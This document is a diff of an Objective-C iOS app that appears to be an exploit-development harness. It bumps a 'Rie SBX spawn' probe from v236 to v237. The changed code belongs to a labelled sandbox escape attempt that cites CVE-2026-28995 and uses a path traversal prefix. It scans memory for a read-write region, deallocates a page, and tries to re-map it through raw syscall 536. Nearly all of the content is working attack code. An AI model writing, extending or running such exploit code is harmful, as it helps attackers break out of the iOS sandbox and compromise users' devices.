@@ -943,7 +943,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *rieConf = [UIButtonConfiguration filledButtonConfiguration];
     rieConf.baseBackgroundColor = [UIColor systemPinkColor];
     self.rieProbeButton.configuration = rieConf;
-    [self.rieProbeButton setTitle:@"Rie SBX spawn (v236)" forState:UIControlStateNormal];
+    [self.rieProbeButton setTitle:@"Rie SBX spawn (v237)" forState:UIControlStateNormal];
     [self.rieProbeButton addTarget:self action:@selector(rieProbeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.rieProbeButton];
 
@@ -9166,7 +9166,7 @@ static uint64_t rie_find_exec_base(task_t task,
 
 - (void)rieProbeTapped {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self appendLog:@"\n=== Rie v236: fix small-region scan filter ===\n"];
+        [self appendLog:@"\n=== Rie v237: dealloc RW (prot=3) page + re-map probe ===\n"];
         NSString *traversalPrefix = @"../../../../../../../../../../../../../";
 
         // ── Phase S: sandbox escape probe (CVE-2026-28995 technique) ──
@@ -9718,11 +9718,9 @@ static uint64_t rie_find_exec_base(task_t task,
             Rie_VMRegionRecurseFn vrr5 = (Rie_VMRegionRecurseFn)dlsym(RTLD_DEFAULT, "mach_vm_region_recurse");
 
             if (vm_dealloc && vrr5) {
-                // Step 0: find last SMALL region (≤16KB) — ideal dealloc target
-                rie_mach_vm_address_t lastRegionAddr = 0;
-                rie_mach_vm_size_t lastRegionSize = 0;
-                rie_mach_vm_address_t finalRegionAddr = 0;
-                rie_mach_vm_size_t finalRegionSize = 0;
+                // Step 0: find first RW (prot=3) region — can dealloc data pages
+                rie_mach_vm_address_t rwRegionAddr = 0;
+                rie_mach_vm_size_t rwRegionSize = 0;
                 {
                     rie_mach_vm_address_t w = 0x180000000ULL;
                     for (int ri = 0; ri < 80; ri++) {
@@ -9733,25 +9731,24 @@ static uint64_t rie_find_exec_base(task_t task,
                         if (vrr5(mach_task_self(), &w, &vs, &d,
                             (rie_vm_region_recurse_info_t)info, &cnt) != KERN_SUCCESS) break;
                         if (w >= 0x200000000ULL) break;
-                        finalRegionAddr = w;
-                        finalRegionSize = vs;
-                        if (vs > 0 && vs <= 0x4000) {
-                            lastRegionAddr = w;
-                            lastRegionSize = vs;
+                        if (vs > 0 && info[0] == 3) { // prot=3 = RW
+                            rwRegionAddr = w;
+                            rwRegionSize = vs;
+                            break;
                         }
                         w += vs;
                     }
                 }
-                if (lastRegionAddr && lastRegionSize > 0 && lastRegionSize <= 0x4000) {
+                if (rwRegionAddr && rwRegionSize > 0) {
                     [self appendLog:[NSString stringWithFormat:
-                        @"  target last region: a=0x%llx sz=0x%llx",
-                        (unsigned long long)lastRegionAddr, (unsigned long long)lastRegionSize]];
+                        @"  RW region: a=0x%llx sz=0x%llx",
+                        (unsigned long long)rwRegionAddr, (unsigned long long)rwRegionSize]];
 
-                    // Test A: deallocate ENTIRE last region
+                    // Test A: deallocate one page (0x4000) from RW region
                     errno = 0;
-                    kern_return_t krA = vm_dealloc(mach_task_self(), lastRegionAddr, lastRegionSize);
+                    kern_return_t krA = vm_dealloc(mach_task_self(), rwRegionAddr, 0x4000);
                     [self appendLog:[NSString stringWithFormat:
-                        @"  A: dealloc ENTIRE region → kr=%d", krA]];
+                        @"  A: dealloc 1 page from RW region → kr=%d", krA]];
 
                     // Test B: check syscall 294 state after dealloc
                     if (krA == KERN_SUCCESS) {
@@ -9777,15 +9774,15 @@ static uint64_t rie_find_exec_base(task_t task,
                         vm_allocate(mach_task_self(), (vm_address_t*)&src, srcSz, VM_FLAGS_ANYWHERE);
                         if (src) {
                             memset(src, 0, srcSz);
-                            tm5.sms_address = lastRegionAddr;
-                            tm5.sms_size = lastRegionSize;
-                            tm5.sms_max_prot = 5; tm5.sms_init_prot = 3;
+                            tm5.sms_address = rwRegionAddr;
+                            tm5.sms_size = 0x4000;
+                            tm5.sms_max_prot = 3; tm5.sms_init_prot = 3;
                             tm5.sms_file_offset = (uint64_t)(uintptr_t)src;
                             tm5.sms_slide_size = 0; tm5.sms_slide_start = 0;
                             errno = 0;
                             long rC = sc(536, 1, &tf5, 1, &tm5);
                             [self appendLog:[NSString stringWithFormat:
-                                @"  C: re-map dealloc region fd=-1 → ret=%ld errno=%d", rC, errno]];
+                                @"  C: re-map dealloc page fd=-1 → ret=%ld errno=%d", rC, errno]];
 
                             // Test D: also try with 0 files, 1 mapping
                             errno = 0;
@@ -9797,9 +9794,7 @@ static uint64_t rie_find_exec_base(task_t task,
                         }
                     }
                 } else {
-                    [self appendLog:[NSString stringWithFormat:
-                        @"  no small region in scan (final region: a=0x%llx sz=0x%llx)",
-                        (unsigned long long)finalRegionAddr, (unsigned long long)finalRegionSize]];
+                    [self appendLog:@"  no RW (prot=3) region found in scan"];
                 }
             } else {
                 [self appendLog:[NSString stringWithFormat:@"  dealloc=%p vrr=%p", vm_dealloc, vrr5]];
